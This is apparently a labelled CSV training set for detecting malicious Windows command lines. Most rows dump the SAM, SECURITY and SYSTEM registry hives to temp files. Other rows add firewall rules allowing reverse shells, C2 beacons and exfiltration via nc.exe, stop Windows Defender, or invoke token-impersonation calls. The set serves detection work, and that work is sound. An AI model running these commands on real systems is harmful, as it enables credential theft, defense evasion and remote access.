text,label
"cmd.exe /c ""reg export hklm\security c:\temp\gqdrv1r1.dat""",1
reg export hklm\security c:\windows\temp\jkrrxyqn.save,1
reg save hklm\sam c:\windows\temp\k0bnxy0o.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\h5gb33kp.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\ru9g34ou.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qot0qnyh.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\xb5m4tem.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\d3d6uqll.dat""",1
reg save hklm\system c:\windows\temp\alwsuyzu.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\2ku3xnnc.dat""",1
reg save hklm\system c:\windows\temp\hbjmu5de.save,1
reg save hklm\system c:\windows\temp\zkav2akg.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\c5octx7f.dat""",1
reg save hklm\system c:\windows\temp\u0wsyy2v.save,1
reg export hklm\system c:\windows\temp\8soybajm.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\8hz6lguw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\hpqfcfzl.dat""",1
reg export hklm\security c:\windows\temp\hex775y0.save,1
"cmd.exe /c ""node  server.js  --port  3000""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\yzst5u1r.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\nh33uvzg.dat""",1
reg save hklm\security c:\windows\temp\rshp0cdc.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wqprn4fg.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9z7kmg1u.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\chjsoenz.dat""",1
"cmd.exe /c ""whoami  /groups""",0
"cmd.exe /c ""reg export hklm\security c:\temp\sk0gdik5.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ulo6qzu0.dat""",1
reg export hklm\system c:\windows\temp\1zwxaany.save,1
reg save hklm\system c:\windows\temp\fhdap4bn.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\y0o7dmto.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\k4xssm8b.dat""",1
reg export hklm\system c:\windows\temp\vrk1uho8.save,1
reg   export   hklm\sam   c:\windows\temp\yu6tvgco.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\xcyceh0s.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)""",3
reg save hklm\system c:\windows\temp\r1fv2op9.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\6tay6kua.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\m7vfg5tj.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\m5pfh80o.dat""",1
"powershell -nop -c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\xeder6eo.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1qg03wd6.dat""",1
reg save hklm\sam c:\windows\temp\vwsbnmt5.save,1
reg export hklm\system c:\windows\temp\m809nrye.save,1
reg save hklm\security c:\windows\temp\ad83ujn3.save,1
reg export hklm\system c:\windows\temp\izo85urt.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\8jriy1kh.dat""",1
reg export hklm\security c:\windows\temp\l25ddhh7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\avfgos5s.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\koa8l7h9.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\udzji5ca.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\x5o02iz0.dat""",1
reg save hklm\sam c:\windows\temp\p3nulpi9.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\qrrc4tfc.dat""",1
reg save hklm\sam c:\windows\temp\wkgktf5c.save,1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg save hklm\sam c:\temp\8tye6ssl.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\woa4c0oy.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5qx4mg7t.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3udjsjam.dat""",1
reg export hklm\system c:\windows\temp\xui2xwdc.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tsii7ze2.dat""",1
reg save hklm\sam c:\windows\temp\cvl0ufx0.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\t3b7chn9.dat""",1
reg save hklm\sam c:\windows\temp\nqbtflj7.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1e9yjxt1.dat""",1
reg save hklm\sam c:\windows\temp\3f1iaih8.save,1
reg save hklm\sam c:\windows\temp\qtbbmhuw.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\jyud5rcz.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\bx0srzcc.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\5j18dthm.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\20vli2by.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\5dqgly6f.dat""",1
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\sam c:\windows\temp\ujf0qm5t.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\c50a87g0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\g76xrpwk.dat""",1
reg export hklm\system c:\windows\temp\xl9y6k6y.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bc7y3zco.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qe4r56rc.dat""",1
reg save hklm\sam c:\windows\temp\qkbrx3d4.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\5zm0dwqk.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\v6fjx9at.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\c9v1hdmp.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vcmj53z7.dat""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\pgaty1dy.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\yaf9doyu.dat""",1
reg save hklm\system c:\windows\temp\2mpan93h.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\qx2d62eg.dat""",1
reg export hklm\security c:\windows\temp\wemq9g61.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\nt2bal5u.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\bab6jzia.dat""",1
reg save hklm\sam c:\windows\temp\7kbvzo2r.save,1
token::elevate,3
"cmd.exe /c ""reg save hklm\security c:\temp\m8jscwwt.dat""",1
reg export hklm\system c:\windows\temp\20eqrs0s.save,1
reg save hklm\security c:\windows\temp\9bj3foeo.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\bparxa0a.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ygl0vf1l.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\miavb5lo.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\qh5ubdpj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\iryq33au.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\78fqkokh.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ahv6cigs.dat""",1
reg save hklm\sam c:\windows\temp\42i2jp61.save,1
reg save hklm\system c:\windows\temp\yeoccqee.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\0oqzv92n.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\wbd56kuz.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lsp4yazy.dat""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\v95rpbel.save""",1
reg save hklm\system c:\windows\temp\iptjp1d5.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\meix6twf.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\1th74k4z.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6eqaeq87.dat""",1
reg save hklm\security c:\windows\temp\r4cztyoy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\m1ry2awh.dat""",1
reg export hklm\sam c:\windows\temp\uxixblph.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\187mu97l.dat""""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\b897vqcd.dat""""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\yn6mzc7l.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\5jjcah49.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3rqo2417.dat""",1
reg save hklm\system c:\windows\temp\gyovee4r.save,1
reg export hklm\system c:\windows\temp\4w1vjy2p.save,1
"netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444",2
"powershell -nop -c ""reg save hklm\sam c:\temp\lnraaeen.dat""",1
reg   export   hklm\sam   c:\windows\temp\yq82k5by.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\i7kfz42d.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\qkg1dej7.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\8r92rcah.save""",1
reg save hklm\security c:\windows\temp\summlf07.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\o12i3xy0.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\iem89cb1.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\199806he.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\en4ts0ch.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\1enkeno8.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\iq896e8z.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\t9gxt3db.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\se5xtxyw.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\hyzyc0xy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qnfuecwy.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yjtf48cs.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\g7jnarh9.dat""",1
reg export hklm\system c:\windows\temp\9vsaawvz.save,1
reg save hklm\security c:\windows\temp\i6yafe86.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\8c8ubne0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\qzdos0qm.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dz08l4e1.dat""",1
reg save hklm\security c:\windows\temp\jpzt6ofz.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3eesv5q6.dat""",1
reg save hklm\security c:\windows\temp\3hvvk6lg.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\044w37bj.dat""",1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\nmacax2d.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\z8hlveav.dat""",1
reg save hklm\system c:\windows\temp\7d8du75m.save,1
reg   save   hklm\system   c:\windows\temp\qnkq9ypz.save,1
reg export hklm\sam c:\windows\temp\qq4by065.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\y4sgaajg.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\leu0bx21.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\c7l2k41c.dat""""",1
reg save hklm\sam c:\windows\temp\zrk08mjr.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\fm4d1955.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\security c:\windows\temp\zjxie1l3.save,1
reg   export   hklm\sam   c:\windows\temp\qhmmjqo5.save,1
reg export hklm\system c:\windows\temp\42gjbmur.save,1
reg export hklm\security c:\windows\temp\ttargz6w.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\qohecvhn.save""",1
"powershell -nop -c ""backup-utility   write   hklm\software   to   c:\backups\config.dat""",0
reg export hklm\sam c:\windows\temp\wf50gjxt.save,1
reg save hklm\sam c:\windows\temp\wc3p28r4.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\klkrk4pn.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r2jm1oxi.dat""",1
reg save hklm\system c:\windows\temp\o5erastu.save,1
"cmd.exe /c ""sc  stop  windefend""",2
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\qu4orpyf.save""",1
$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
"powershell -nop -c ""reg export hklm\sam c:\temp\i6nphe0e.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\bgvqc3y7.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\nmw9ibs3.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\epnk84uf.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mlxxugfo.dat""",1
reg save hklm\security c:\windows\temp\mvzugksi.save,1
reg save hklm\sam c:\windows\temp\kkh51ru9.save,1
reg export hklm\sam c:\windows\temp\sxy078sv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\c47alg6a.dat""",1
reg export hklm\system c:\windows\temp\smiq43h9.save,1
reg save hklm\sam c:\windows\temp\luh1igbr.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\b9ydq9l7.dat""""",1
reg export hklm\system c:\windows\temp\cariqdu9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\96d9ljbe.dat""",1
reg save hklm\system c:\windows\temp\10zf2178.save,1
reg export hklm\sam c:\windows\temp\qr16yxs1.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\s6qv4cm7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\7cgba79n.dat""",1
reg save hklm\security c:\windows\temp\w7qtn9rh.save,1
reg save hklm\system c:\windows\temp\4sz3fdwc.save,1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\y19tndc8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yw3jnra6.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\66g9l8d3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yb0fikl9.dat""",1
reg save hklm\sam c:\windows\temp\nm1o4yw6.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\39vaac5n.dat""",1
reg save hklm\system c:\windows\temp\joofkb68.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\6hrtnf6e.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\s0ljzvqe.dat""",1
reg export hklm\system c:\windows\temp\tijqp0u8.save,1
"powershell -nop -c ""whoami   /groups""",0
"powershell -nop -c ""reg export hklm\security c:\temp\y5weqrgg.dat""",1
reg save hklm\system c:\windows\temp\911x5x9j.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\vm9q8ytv.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\t1takmt0.dat""",1
reg export hklm\sam c:\windows\temp\b1404d4d.save,1
reg save hklm\system c:\windows\temp\l9urtqqf.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dd8hj50s.dat""",1
reg save hklm\system c:\windows\temp\g9p9tjr2.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7aplm9h4.dat""",1
reg export hklm\system c:\windows\temp\nxam4jzr.save,1
reg export hklm\security c:\windows\temp\kvordm1e.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\g8o9n8cw.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\mvkbrvmi.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ud7kj298.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\7sj4y76t.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\o77y2mgh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\1rotcayg.dat""",1
reg export hklm\security c:\windows\temp\d72jx2ph.save,1
reg save hklm\security c:\windows\temp\8me3y5vr.save,1
reg export hklm\sam c:\windows\temp\k5a2lt6i.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7umf8o2p.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dqp3l2qg.dat""",1
reg export hklm\sam c:\windows\temp\kyw8050s.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\rqyqjb44.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\t7s7m054.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\5unp3rwy.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8bmaaa2c.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\d0wriub9.dat""""",1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
reg save hklm\sam c:\windows\temp\a5cmuyer.save,1
reg export hklm\security c:\windows\temp\pr99u9bh.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\555f3c07.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\0edn9xzu.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0izw1pgf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\q4gq7e26.dat""",1
reg export hklm\system c:\windows\temp\86hpgvfc.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\sam c:\windows\temp\98vqftll.save,1
reg export hklm\security c:\windows\temp\dlgv4y55.save,1
reg  save  hklm\security  c:\windows\temp\b0d0mxjd.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ajv0xg15.dat""",1
netsh  dump  >  netconfig.txt,0
"cmd.exe /c ""reg export hklm\security c:\temp\4rwe0fcr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\g822qap2.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\jzpn0yqj.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\t6ghpk3n.dat""",1
reg export hklm\system c:\windows\temp\8xov3edq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ab0uuxd1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\jqkbgmfa.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6t14x7rk.dat""",1
reg export hklm\sam c:\windows\temp\qzmrk416.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\s7dhxq09.dat""",1
reg export hklm\sam c:\windows\temp\g77g5w8e.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gcjggn5e.dat""",1
"[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)",3
reg save hklm\system c:\windows\temp\3c2zf5yh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\maty738i.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\bgi7mv1t.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\72wsd30h.dat""",1
reg export hklm\sam c:\windows\temp\of6pm2wo.save,1
sc  query  windefend,0
reg save hklm\security c:\windows\temp\nyk9nmxt.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\viypnki4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1x9twkgn.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\9t2l7tlg.dat""",1
reg save hklm\sam c:\windows\temp\dwsdldye.save,1
"powershell -nop -c ""klist  purge""",3
"powershell -nop -c ""reg export hklm\security c:\temp\fxh2clgz.dat""",1
reg export hklm\system c:\windows\temp\z4axua86.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kapsh291.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\pcmovxlc.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ads2d3si.dat""",1
reg export hklm\system c:\windows\temp\4wfu931k.save,1
reg save hklm\sam c:\windows\temp\6m2byx8j.save,1
reg export hklm\sam c:\windows\temp\vxwfrj4q.save,1
reg export hklm\system c:\windows\temp\e1aue654.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\hj7z9hzk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xuucyspl.dat""",1
reg export hklm\system c:\windows\temp\8mjm26sv.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\rquzjqnl.save""",1
"powershell -nop -c ""backup-utility   save   registry   config""",0
reg export hklm\sam c:\windows\temp\7l14xi2h.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\kdxcdwht.dat""",1
reg save hklm\security c:\windows\temp\yk5cy9ib.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ri34qaza.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\i55litrz.dat""",1
reg save hklm\security c:\windows\temp\alv1kb7n.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cjkidc83.dat""",1
rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken'),3
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\n8fuuc9a.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\jxjks7u8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wjya5psk.dat""",1
reg export hklm\system c:\windows\temp\xazgxbyr.save,1
reg  export  hklm\system  c:\windows\temp\17819gj2.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\52b6swa1.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\5h7i5kpv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3wz8prat.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jvuy9czz.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""sc   query   windefend""",0
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\ujxo1u8o.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\6ykmuytb.dat""",1
reg export hklm\system c:\windows\temp\s7t4h4so.save,1
reg save hklm\system c:\windows\temp\7c62sz2a.save,1
reg   export   hklm\sam   c:\windows\temp\plihotvv.save,1
reg save hklm\security c:\windows\temp\wf1o7ce1.save,1
reg  save  hklm\sam  c:\windows\temp\p7m4mw8h.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\f8fislsl.dat""""",1
reg export hklm\security c:\windows\temp\rgqgvwv1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9y7d5wei.dat""",1
reg save hklm\sam c:\windows\temp\02u0ny1h.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0rxat1kd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rdpc8gne.dat""",1
reg export hklm\system c:\windows\temp\fdkgyzou.save,1
$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
reg export hklm\system c:\windows\temp\8a51911y.save,1
reg export hklm\system c:\windows\temp\rnhuwfbf.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\sx2ofk6c.save""",1
reg export hklm\system c:\windows\temp\rxk97l8f.save,1
reg export hklm\security c:\windows\temp\nv3o0kam.save,1
reg save hklm\system c:\windows\temp\9wag6o5c.save,1
reg export hklm\system c:\windows\temp\h2xritg8.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\suffta8b.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\54v17x14.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\8zq6mi24.dat""",1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\77z9e4qb.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\9rv2ynmu.dat""""",1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg export hklm\sam c:\temp\ndumv7fv.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\s979zx22.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\o2uk5ilt.dat""""",1
reg save hklm\security c:\windows\temp\6873bxmn.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\u6b5zbyl.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\d8hwn159.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\8qbuyv72.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\zttgkwd2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\2oxu78in.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\xulqxzou.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\sam c:\windows\temp\e80lo2kv.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\mmsl17c9.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\5m11adhj.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\10kijdvc.save""",1
reg export hklm\system c:\windows\temp\fdadlms3.save,1
reg export hklm\sam c:\windows\temp\0n9h5i3p.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\v3mgvsix.dat""",1
